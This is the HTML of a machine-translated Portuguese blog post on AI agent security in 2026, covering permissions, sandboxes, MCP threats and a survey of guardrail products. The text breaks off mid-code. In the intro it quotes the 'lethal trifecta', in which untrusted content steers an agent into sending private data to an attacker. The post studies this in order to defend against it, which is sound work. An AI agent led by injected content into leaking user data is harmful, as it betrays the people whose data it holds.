+  <a href="#o-top-10-owasp-asi-edicao-de-2026" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        O Top 10 OWASP ASI, edição de 2026
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#permissoes-sao-infraestrutura-nao-prompt" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Permissões são infraestrutura, não prompt
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Permissões são infraestrutura, não prompt">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#openai-agents-sdk" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        OpenAI Agents SDK
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#codex-cli-e-a-camada-de-politica-gerida" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Codex CLI e a camada de política gerida
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#a-escada-de-permissoes-do-claude-code" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        A escada de permissões do Claude Code
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#tres-blast-radii-num-so-ficheiro" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Três blast radii num só ficheiro
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#a-imposicao-de-sandbox-e-uma-questao-do-so" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        A imposição de sandbox é uma questão do SO
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#para-alem-do-claude-code-e-do-codex-o-que-usa-o-resto-da-industria" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Para além do Claude Code e do Codex: o que usa o resto da indústria
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#hooks-pretooluse-como-politica-programavel" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Hooks PreToolUse como política programável
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#human-in-the-loop-e-os-numeros-sobre-se-alguem-le-realmente-estes-prompts" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Human-in-the-Loop, e os números sobre se alguém lê realmente estes prompts
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Human-in-the-Loop, e os números sobre se alguém lê realmente estes prompts">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#o-primitivo-do-langgraph" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        O primitivo do LangGraph
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#humanlayer-aprovacao-como-produto" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        HumanLayer: aprovação como produto
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#os-numeros-de-que-ninguem-quer-falar" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Os números de que ninguém quer falar
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#o-principio-de-desenho" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        O princípio de desenho
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#scoping-de-mcp-e-supply-chain" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Scoping de MCP e supply chain
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Scoping de MCP e supply chain">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#autorizacao-mcp-em-tres-revisoes" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Autorização MCP em três revisões
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#a-checklist-mcp-de-2026" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        A checklist MCP de 2026
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#supply-chain-e-a-versao-aborrecida-de-tudo-isto" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Supply chain é a versão aborrecida de tudo isto
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#uma-stack-guardia-para-o-agente-market-analyst" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Uma stack guardiã para o agente Market Analyst
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Uma stack guardiã para o agente Market Analyst">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#camada-1-um-hook-pretooluse-deny-list" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Camada 1: um hook PreToolUse deny-list
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#camada-2-um-input-canary-para-prompt-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Camada 2: um input canary para prompt injection
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#camada-3-validacao-estruturada-do-output-via-stop-hook" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Camada 3: validação estruturada do output via Stop hook
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#camada-4-um-interrupt-gate-sobre-qualquer-acao-de-saida" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Camada 4: um interrupt gate sobre qualquer ação de saída
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#o-que-esta-stack-nao-faz" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        O que esta stack não faz
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#principais-conclusoes" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Principais conclusões
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#referencias" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Referências
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Referências">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#os-enquadramentos" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Os enquadramentos
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#produtos-de-llm-guardrails" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Produtos de LLM guardrails
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#incidentes" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Incidentes
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#superficies-de-politica" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Superfícies de política
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#hitl" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        HITL
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#owasp" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        OWASP
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#serie" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Série
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+             
+<div class="md-content md-content--post" data-md-component="content">
+  <div
+    class="md-sidebar md-sidebar--post"
+    data-md-component="sidebar"
+    data-md-type="navigation"
+  >
+    <div class="md-sidebar__scrollwrap">
+      <div class="md-sidebar__inner md-post">
+        <nav class="md-nav md-nav--primary">
+          <div class="md-post__back">
+            <div class="md-nav__title md-nav__container">
+              <a href="../../../../../.." class="md-nav__link">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+                <span class="md-ellipsis"> Voltar ao índice </span>
+              </a>
+            </div>
+          </div>
+
+          
+          <ul class="md-post__meta md-nav__list">
+            <li class="md-nav__item md-nav__item--section">
+              <div class="md-post__title">
+                <span class="md-ellipsis"
+                  >Temas</span
+                >
+              </div>
+              <nav class="md-nav">
+                          
+                <div
+                  class="blog-category-section"
+                >
+                  <div class="blog-category-header">
+                    <span class="blog-category-icon"
+                      >🤖</span
+                    >
+                    <span class="blog-category-name"
+                      >Engenharia de IA</span
+                    >
+                  </div>
+                  <ul class="blog-category-posts">
+                      
+                    <li
+                      class="blog-category-post"
+                    >
+                      <a href="../../../05/10/evaluating-rag-metrics-for-every-stage-of-a-production-rag-system/">Avaliar RAG: Métricas para Cada Etapa de um Sistema RAG em Produção</a>
+                    </li>
+                    
+                    <li
+                      class="blog-category-post"
+                    >
+                      <a href="../../02/the-definitive-guide-to-ner-in-2026-encoders-llms-and-the-3-tier-production-architecture/">O Guia Definitivo para NER em 2026: Encoders, LLMs e a Arquitetura de Produção em 3 Camadas</a>
+                    </li>
+                    
+                    <li
+                      class="blog-category-post"
+                    >
+                      <a href="../../../03/13/the-llm-engineering-field-guide-45-concepts-every-practitioner-needs/">Guia de Engenharia de LLM: 45 Conceitos para Inferência, Treino, Arquitetura e Operações</a>
+                    </li>
+                    
+                    <li
+                      class="blog-category-post"
+                    >
+                      <a href="../../../03/04/the-definitive-guide-to-ocr-in-2026-from-pipelines-to-vlms/">O Guia Definitivo de OCR em 2026: De Pipelines a VLMs</a>
+                    </li>
+                    
+                    <li
+                      class="blog-category-post"
+                    >
+                      <a href="../../../01/04/the-complete-guide-to-llm-fine-tuning-in-2025-from-theory-to-production/">Guia de Fine-Tuning de LLMs: LoRA, QLoRA, DoRA, Unsloth, Axolotl e Deployment</a>
+                    </li>
+                    
+                    <li
+                      class="blog-category-post"
+                    >
+                      <a href="../../../../2025/10/22/lorax-playbook---orchestrating-thousands-of-lora-adapters-on-kubernetes/">Guia de Serving com LoRAX: Milhares de Adaptadores LoRA em Kubernetes</a>
+                    </li>
+                    
+                    <li
+                      class="blog-category-post"
+                    >
+                      <a href="../../../../2025/05/11/choosing-the-right-open-source-llm-variant--file-format/">Variantes e Formatos de Ficheiro de LLM Open-Source: Instruct, GGUF, GPTQ, AWQ e MoE</a>
+                    </li>
+                    
+                    <li
+                      class="blog-category-post"
+                    >
+                      <a href="../../../../2025/05/10/quick-guide-on-running-llms-locally-on-macos/">LLMs locais no macOS: Ollama, LM Studio, llama.cpp, MLX e Apple Silicon</a>
+                    </li>
+                    
+                    <li
+                      class="blog-category-post"
+                    >
+                      <a href="../../../../2025/05/04/scaling-large-language-models-multi-gpu-and-multi-node-strategies-that-hold-up-in-practice/">Escalar Grandes Modelos de Linguagem: Estratégias Multi-GPU e Multi-Nó Que Funcionam na Prática</a>
+                    </li>
+                     
+                  </ul>
+                </div>
+                 
+                <div
+                  class="blog-category-section blog-category-section--active"
+                >
+                  <div class="blog-category-header">
+                    <span class="blog-category-icon"
+                      >📚</span
+                    >
+                    <span class="blog-category-name"
+                      >Agentes 101</span
+                    >
+                  </div>
+                  <ul class="blog-category-posts">
+                      
+                    <li
+                      class="blog-category-post"
+                    >
+                      <a href="../../../05/26/the-runtime--running-agents-for-hours-not-seconds/">Runtime de Agentes de IA de Longa Duração em 2026: Sessões, Sandboxes, Checkpoints e Harnesses</a>
+                    </li>
+                    
+                    <li
+                      class="blog-category-post blog-category-post--active"
+                    >
+                      <a href="./">Segurança de Agentes de IA em 2026: Guardrails, Permissões, Sandboxes e Ameaças MCP</a>
+                    </li>
+                    
+                    <li
+                      class="blog-category-post"
+                    >
+                      <a href="../../../03/24/the-hands--tool-ergonomics-and-the-agent-computer-interface/">Utilização de Ferramentas por Agentes de IA em 2026: MCP, CLI, Skills e Execução de Código</a>
+                    </li>
+                    
+                    <li
+                      class="blog-category-post"
+                    >
+                      <a href="../../../02/14/the-cortex--architecting-memory-for-ai-agents/">Arquitetura de Memória para Agentes de IA em 2026: Checkpoints, Vector Stores e Memória Baseada em Ficheiros</a>
+                    </li>
+                    
+                    <li
+                      class="blog-category-post"
+                    >
+                      <a href="../../../01/31/the-cognitive-engine--choosing-the-right-reasoning-loop/">Ciclos de raciocínio de agentes de IA em 2026: ReAct vs ReWOO vs Plan-and-Execute</a>
+                    </li>
+                     
+                  </ul>
+                </div>
+                 
+                <div
+                  class="blog-category-section"
+                >
+                  <div class="blog-category-header">
+                    <span class="blog-category-icon"
+                      >🦾</span
+                    >
+                    <span class="blog-category-name"
+                      >IA agêntica</span
+                    >
+                  </div>
+                  <ul class="blog-category-posts">
+                      
+                    <li
+                      class="blog-category-post"
+                    >
+                      <a href="../../../01/11/enterprise-rag-challenge-3-winning-approaches-for-autonomous-ai-agents/">Enterprise RAG Challenge 3 (ECR3): Arquiteturas de Agentes de IA Vencedoras</a>
+                    </li>
+                    
+                    <li
+                      class="blog-category-post"
+                    >
+                      <a href="../../../../2025/12/28/schema-guided-reasoning-on-vllm---turning-llms-into-reliable-business-logic-engines/">Raciocínio Guiado por Esquema em vLLM: Outputs Estruturados com xgrammar e Pydantic</a>
+                    </li>
+                    
+                    <li
+                      class="blog-category-post"
+                    >
+                      <a href="../../../../2025/10/20/domain-driven-design-for-ai-agents-a-beginner-friendly-guide/">Domain-Driven Design para Agentes de IA: Contextos Delimitados, Ferramentas e Regras de Negócio</a>
+                    </li>
+                    
+                    <li
+                      class="blog-category-post"
+                    >
+                      <a href="../../../../2025/10/05/context-engineering-in-the-agenticai-era/">Engenharia de Contexto para Agentes de IA: Janelas de Contexto, Memória, Ferramentas e Guardrails</a>
+                    </li>
+                     
+                  </ul>
+                </div>
+                 
+                <div
+                  class="blog-category-section"
+                >
+                  <div class="blog-category-header">
+                    <span class="blog-category-icon"
+                      >🔧</span
+                    >
+                    <span class="blog-category-name"
+                      >Infraestrutura</span
+                    >
+                  </div>
+                  <ul class="blog-category-posts">
+                      
+                    <li
+                      class="blog-category-post"
+                    >
+                      <a href="../../../02/21/benchmarking-modern-data-processing-engines/">Motores Modernos de Processamento de Dados em Comparação: Polars, DataFusion, Daft, Ray Data, Pandas e Spark</a>
+                    </li>
+                    
+                    <li
+                      class="blog-category-post"
+                    >
+                      <a href="../../../../2025/05/06/mlops-in-the-age-of-foundation-models-evolving-infrastructure-for-llms-and-beyond/">MLOps vs LLMOps: Infraestrutura para Modelos Fundacionais e Sistemas LLM</a>
+                    </li>
+                     
+                  </ul>
+                </div>
+                 
+                <div
+                  class="blog-category-section"
+                >
+                  <div class="blog-category-header">
+                    <span class="blog-category-icon"
+                      ></span
+                    >
+                    <span class="blog-category-name"
+                      >Análise de artigos</span
+                    >
+                  </div>
+                  <ul class="blog-category-posts">
+                      
+                    <li
+                      class="blog-category-post"
+                    >
+                      <a href="../../../01/21/mhc-how-deepseek-scaled-residual-connections-without-breaking-training/">Hyper-Connections Constrangidas à Variedade (mHC): explicação do dimensionamento residual do DeepSeek</a>
+                    </li>
+                     
+                  </ul>
+                </div>
+                 
+                <div
+                  class="blog-category-section"
+                >
+                  <div class="blog-category-header">
+                    <span class="blog-category-icon"
+                      >🐍</span
+                    >
+                    <span class="blog-category-name"
+                      >Python</span
+                    >
+                  </div>
+                  <ul class="blog-category-posts">
+                      
+                    <li
+                      class="blog-category-post"
+                    >
+                      <a href="../../../../2025/05/08/the-ultimate-guide-to-pyprojecttoml/">Guia de `pyproject.toml`: Empacotamento Python, Dependências e Configuração de Ferramentas</a>
+                    </li>
+                    
+                    <li
+                      class="blog-category-post"
+                    >
+                      <a href="../../../../2025/04/17/quick-guide-managing-python-on-macos-with-uv/">uv no macOS: Gerir versões de Python, projetos e ferramentas</a>
+                    </li>
+                     
+                  </ul>
+                </div>
+                 
+                <div
+                  class="blog-category-section"
+                >
+                  <div class="blog-category-header">
+                    <span class="blog-category-icon"
+                      >🔍</span
+                    >
+                    <span class="blog-category-name"
+                      >Pesquisa e recomendações</span
+                    >
+                  </div>
+                  <ul class="blog-category-posts">
+                      
+                    <li
+                      class="blog-category-post"
+                    >
+                      <a href="../../../02/08/building-a-modern-search-ranking-stack-from-embeddings-to-llm-powered-relevance/">Search Ranking Stack em 2026: BM25, Embeddings, Cross-Encoders e Reranking com LLM</a>
+                    </li>
+                     
+                  </ul>
+                </div>
+                 
+                <div
+                  class="blog-category-section"
+                >
+                  <div class="blog-category-header">
+                    <span class="blog-category-icon"
+                      >🛠️</span
+                    >
+                    <span class="blog-category-name"
+                      >Ferramentas</span
+                    >
+                  </div>
+                  <ul class="blog-category-posts">
+                      
+                    <li
+                      class="blog-category-post"
+                    >
+                      <a href="../../../../2025/06/10/building-a-custom-featurestorelite-mcp-server-using-uv/">Tutorial de Servidor MCP com uv e FastMCP: Criar um Servidor FeatureStoreLite</a>
+                    </li>
+                    
+                    <li
+                      class="blog-category-post"
+                    >
+                      <a href="../../../../2025/05/10/quick-guide-on-local-stable-diffusion-toolkits-for-macos/">Stable Diffusion no macOS: Draw Things, DiffusionBee, ComfyUI, A1111 e Fooocus</a>
+                    </li>
+                    
+                    <li
+                      class="blog-category-post"
+                    >
+                      <a href="../../../../2025/05/07/mastering-zsh-startup-zprofile-vs-zshrc/">Ficheiros de arranque do Zsh: `~/.zprofile` vs `~/.zshrc` no macOS e Linux</a>
+                    </li>
+                    
+                    <li
+                      class="blog-category-post"
+                    >
+                      <a href="../../../../2025/04/19/quick-guide-on-setting-up-a-macbook-for-ai-engineering/">Configuração de MacBook para Engenharia de IA: ferramentas macOS, Python, Docker e fluxo de trabalho no terminal</a>
+                    </li>
+                     
+                  </ul>
+                </div>
+                
+              </nav>
+            </li>
+          </ul>
+
+          
+        </nav>
+        
+      </div>
+    </div>
+  </div>
+  <article class="md-content__inner md-typeset">
+     
+  
+
+
+
+
+<!-- automated-translation-notice:start -->
+
+<div class="admonition info">
+<p class="admonition-title">Tradução automática</p>
+</div>
+<p>Este artigo foi traduzido automaticamente a partir da versão original em inglês.</p>
+<!-- automated-translation-notice:end -->
+
+<h1 id="seguranca-de-agentes-de-ia-em-2026-guardrails-permissoes-sandboxes-e-ameacas-mcp">Segurança de Agentes de IA em 2026: Guardrails, Permissões, Sandboxes e Ameaças MCP</h1>
+<p><strong>Parte 4 da série Engineering the Agentic Stack</strong></p>
+<p>A segurança de agentes de IA não é o mesmo problema que a segurança de LLMs. Em 2024 lançámos guardrails. NeMo Guardrails, Bedrock Guardrails e um punhado de produtos semelhantes envolveram o input e o output de uma chamada ao modelo e fizeram uma pergunta: <em>o modelo está a produzir a coisa certa?</em> Output tóxico, fuga de PII, jailbreak, fora de tópico. Filtrar, redigir, recusar. A ameaça era fácil de ver porque só havia dois sítios para inspecionar: input e output.</p>
+<p>Depois demos ao modelo um loop de ferramentas, um sistema de ficheiros, uma shell, um registo Model Context Protocol (MCP) e autoridade para agir. O modelo de ameaças dos agentes de IA mudou por baixo de nós e a maioria dos guardrails de 2024 nem reparou. <!-- 🌶️ --> Seis incidentes graves em dezoito meses (EchoLeak, o comprometimento da extensão Amazon Q Developer, a divulgação do Azure MCP Server, Claude Code CVE-2025-59536, o trojan de acesso remoto em axios 1.14.1 e o tag hijack do Trivy Actions, todos analisados abaixo) não podiam ser resolvidos com um filtro de output melhor. O output estava bem. O <em>sistema</em> foi comprometido.</p>
+<!-- more -->
+
+<p><strong>TL;DR</strong>: os guardrails de LLM e os filtros de conteúdo envolvem uma única chamada ao modelo e observam o que ele diz. A segurança de agentes de IA envolve todo o loop de uso de ferramentas e observa o que ele tenta fazer. Todos os grandes incidentes com agentes em 2025–2026 exploraram o loop, e nenhum deles disparou um filtro de conteúdo. A stack de políticas de 2026 tem seis camadas: escadas de permissões, hooks pré-ferramenta, sandboxes ao nível do SO, interrupções com human-in-the-loop, tokens MCP vinculados à audiência e o Top 10 da OWASP Agentic Security Initiative (ASI) como mapa de ameaças.</p>
+<p>Os filtros de conteúdo são baratos e vale a pena comprá-los off the shelf. Tudo o resto nessa lista é trabalho de engenharia que a tua equipa tem de fazer, e consome a maior parte do teu orçamento de segurança.</p>
+<hr />
+<h2 id="porque-e-que-a-seguranca-de-agentes-de-ia-e-diferente-da-seguranca-de-llms">Porque é que a segurança de agentes de IA é diferente da segurança de LLMs</h2>
+<p>Bharani Subramaniam e Martin Fowler enquadraram o tema no início de 2025 em <em><a href="https://martinfowler.com/articles/gen-ai-patterns/">Emerging Patterns in Building GenAI Products</a></em>. A observação deles era estreita e direta:</p>
+<blockquote>
+<p>"With traditional systems, we could assess correctness primarily through testing... With LLM-based systems, we encounter a system that no longer behaves deterministically."</p>
+</blockquote>
+<p>A indústria ouviu isto, construiu suites de avaliação para outputs de modelos e esqueceu-se de avaliar o que o modelo podia realmente <em>fazer</em>: chamar ferramentas, executar comandos shell, escrever ficheiros. O reenquadramento de 2026 é o que importa: <em>"is the model producing the right thing?"</em> não é a mesma pergunta que <em>"is the system doing the right thing?"</em> A primeira é um mercado cheio. A segunda é onde os problemas de produção realmente vivem.</p>
+<p><img alt="Os guardrails de LLM envolvem uma chamada ao modelo; os guardiões de agentes envolvem o loop" src="../../../../assets/2026-04-20-the-guardians/llm-vs-agent-guardian.svg" /></p>
+<p>Simon Willison deu nome à forma deste risco específico de agentes em junho de 2025 com a <a href="https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/">lethal trifecta</a>:</p>
+<blockquote>
+<p>"The lethal trifecta of capabilities is: access to your private data; exposure to untrusted content; the ability to externally communicate in a way that could be used to steal your data. If your agent combines these three features, an attacker can easily trick it into accessing your private data and sending it to that attacker."</p>
+</blockquote>
+<p>Lê isto e depois olha para qualquer diagrama de arquitetura de agentes. Leitura da inbox mais fetch web mais post no Slack. Acesso ao repo mais leitor de issues mais escrita de PRs. Calendário mais email mais SMS. A trifecta não é um caso limite. É a forma por omissão de qualquer agente útil num portátil corporativo. Um guardrail de LLM pergunta se o modelo disse algo inseguro. A trifecta pergunta se o sistema pode ser <em>guiado</em> para comportamento inseguro. Pergunta diferente.</p>
+<p><img alt="A lethal trifecta" src="../../../../assets/2026-04-20-the-guardians/lethal-trifecta.svg" /></p>
+<p>A versão estrutural do mesmo argumento está no preprint <em>Parallax</em> de Joel Fokou (<a href="https://arxiv.org/abs/2604.12986">arXiv 2604.12986</a>, submetido a 14 de abril de 2026, sem peer review). A tese central:</p>
+<blockquote>
+<p>"The system that reasons about actions must be structurally unable to execute them, and the system that executes actions must be structurally unable to reason about them, with an independent, immutable validator interposed between the two."</p>
+</blockquote>
+<p>Não é preciso comprar os números de avaliação do artigo para aceitar o ponto estrutural. Todos os harnesses lançados em abril de 2026 aproximam um dos seus quatro princípios:</p>
+<ul>
+<li>Hooks PreToolUse do Claude Code</li>
+<li>Executor isolado ao nível do SO do Codex CLI (bubblewrap/seccomp em Linux)</li>
+<li>Cofre de credenciais do Managed Agents fora da sandbox</li>
+<li>Tokens vinculados à audiência do RFC 8707 no MCP</li>
+</ul>
+<p>Separação cognitivo-executiva, manter separada a coisa que decide da coisa que age, não é um teste de pureza. É a forma dos sistemas que ainda não foram comprometidos.</p>
+<p>Há uma disciplina complementar que Alessandro Pignati nomeou da forma mais clara em <a href="https://dev.to/alessandro_pignati/your-ai-agent-has-too-much-power-understanding-and-taming-excessive-agency-4kbc">janeiro de 2026</a>: o <strong>Princípio da Menor Agency</strong>. Least Privilege pergunta <em>a que é que esta identidade pode aceder?</em> Least Agency pergunta <em>o que é que este agente pode decidir?</em> O privilégio restringe as credenciais; a agency restringe o alcance de um plano mesmo quando as credenciais são válidas. O Top 10 da OWASP para Agentic Applications trata Excessive Agency como uma das dez falhas por categoria. Least Agency é a disciplina de desenho que a previne. <!-- 🌶️ --> Um agente que consegue resumir a tua inbox provavelmente não precisa de permissões de commit no teu monorepo. Continuamos a encontrar configurações em que precisa.</p>
+<hr />
+<h2 id="o-que-os-llm-guardrails-realmente-cobrem">O que os LLM Guardrails realmente cobrem</h2>
+<p>Antes de argumentar o que os LLM guardrails falham, quero dar-lhes crédito pelo que fazem. <!-- 🌶️ --> Fazem trabalho útil dentro da chamada ao modelo. Simplesmente não veem o loop à volta dela.</p>
+<p>Para dar nome claro à camada: os LLM guardrails são a <strong>camada de filtragem de conteúdo</strong>. Inspecionam o texto que entra no modelo e o texto que sai, e bloqueiam, redigem ou assinalam o que não passa. Os sete produtos abaixo encaixam nessa forma, e vou referir-me a eles como "filtros de conteúdo" quando as secções seguintes precisarem de contrastá-los com escadas de permissões e human-in-the-loop.</p>
+<p>O mercado está maduro e comoditizado. Todos os grandes hyperscalers têm um produto, as formas convergem e o preço está em cêntimos por mil unidades de texto. Um diagrama de arquitetura de 2026 vai incluir um dos sete abaixo, e deve incluir. Só não o confundas com um perímetro.</p>
+<h3 id="nvidia-nemo-guardrails">NVIDIA NeMo Guardrails</h3>
+<p>O mais opinativo: um framework de orquestração em torno de cinco tipos de rails (input, dialog, retrieval, execution, output) com a sua própria DSL — <strong>Colang</strong>, uma linguagem ao estilo de Python para fluxos de diálogo, intenções do utilizador e mensagens do bot. Podes tratar do básico com Python + YAML, mas a lógica de diálogo mais rica é escrita em Colang — daí "opinionated". Documentação em <a href="https://docs.nvidia.com/nemo/guardrails/">docs.nvidia.com/nemo/guardrails</a>.</p>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">nemoguardrails</span><span class="w"> </span><span class="kn">import</span> <span class="n">LLMRails</span><span class="p">,</span> <span class="n">RailsConfig</span>
+
+<span class="n">config</span> <span class="o">=</span> <span class="n">RailsConfig</span><span class="o">.</span><span class="n">from_path</span><span class="p">(</span><span class="s2">&quot;./config&quot;</span><span class="p">)</span>
+<span class="n">rails</span> <span class="o">=</span> <span class="n">LLMRails</span><span class="p">(</span><span class="n">config</span><span class="p">)</span>
+<span class="n">response</span> <span class="o">=</span> <span class="n">rails</span><span class="o">.</span><span class="n">generate</span><span class="p">(</span>
+    <span class="n">messages</span><span class="o">=</span><span class="p">[{</span><span class="s2">&quot;role&quot;</span><span class="p">:</span> <span class="s2">&quot;user&quot;</span><span class="p">,</span> <span class="s2">&quot;content&quot;</span><span class="p">:</span> <span class="s2">&quot;Hello&quot;</span><span class="p">}]</span>
+<span class="p">)</span>
+</code></pre></div>
+<p>O <a href="https://github.com/NVIDIA/NeMo-Guardrails">repo</a> do NeMo é explícito quanto ao seu modelo de ameaças: <em>"common LLM vulnerabilities, such as jailbreaks and prompt injections."</em> É igualmente explícito quanto ao seu âmbito: <em>"The built-in guardrails may or may not be suitable for a given production use case... developers should work with their internal application team to ensure guardrails meets requirements."</em> O que isto significa na prática: o NeMo observa o que o modelo diz. O que o agente <em>faz</em> (que ferramentas chama, que argumentos passa, o que lê de volta do sistema de ficheiros) é contigo.</p>
+<h3 id="meta-llama-guard-4">Meta Llama Guard 4</h3>
+<p>Um classificador puro de conteúdo 12B podado a partir do Llama-4-Scout, alinhado com a taxonomia de hazards da MLCommons (13 categorias de dano mais abuso do code interpreter, de acordo com o <a href="https://huggingface.co/meta-llama/Llama-Guard-4-12B">model card</a>). A Meta é invulgarmente franca quanto aos limites:</p>
+<blockquote>
+<p>"Some hazard categories may require factual, up-to-date knowledge to be evaluated fully... Lastly, as an LLM, Llama Guard 4 may be susceptible to adversarial attacks or prompt injection attacks that could bypass or alter its intended use: see <strong>Llama Prompt Guard 2</strong> for detecting prompt attacks."</p>
+</blockquote>
+<p>A Meta fornece um produto separado para defender o seu classificador de conteúdo contra prompt injection. Se esta frase parece uma admissão estrutural, é porque é.</p>
+<h3 id="guardrails-ai">Guardrails AI</h3>
+<p>Um registo de validadores. Compones mais de 60 validadores do Hub (PII via Presidio, JailbreakDetect, CompetitorCheck, verificações de provenance) com fail-modes <code>raise | fix | filter | refrain | reask | noop</code> (<a href="https://guardrailsai.com">guardrailsai.com</a>). Não existe um modelo de ameaças unificado; a cobertura equivale à união dos validadores instalados. <!-- 🌶️ --> Pontos fortes: flexível (tens o que instalares). Pontos fracos: flexível (tens <em>apenas</em> o que instalares).</p>
+<h3 id="lakera-guard">Lakera Guard</h3>
+<p>O incumbente API SaaS, treinado com dezenas de milhões de amostras de ataque recolhidas do <a href="https://gandalf.lakera.ai/">Gandalf</a>. Promete filtrar input e output para "prompt attacks... and data leakage." O free tier é 10.000 requests/mês; o pricing enterprise é opaco.</p>
+<h3 id="aws-bedrock-guardrails">AWS Bedrock Guardrails</h3>
+<p>O default empresarial se já estiveres em Bedrock. <code>ApplyGuardrail</code> funciona com qualquer modelo, Bedrock ou não:</p>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">boto3</span>
+
+<span class="n">brt</span> <span class="o">=</span> <span class="n">boto3</span><span class="o">.</span><span class="n">client</span><span class="p">(</span><span class="s2">&quot;bedrock-runtime&quot;</span><span class="p">)</span>
+<span class="n">resp</span> <span class="o">=</span> <span class="n">brt</span><span class="o">.</span><span class="n">apply_guardrail</span><span class="p">(</span>
+    <span class="n">guardrailIdentifier</span><span class="o">=</span><span class="s2">&quot;gr-xxxxxxxxxxxx&quot;</span><span class="p">,</span>
+    <span class="n">guardrailVersion</span><span class="o">=</span><span class="s2">&quot;2&quot;</span><span class="p">,</span>
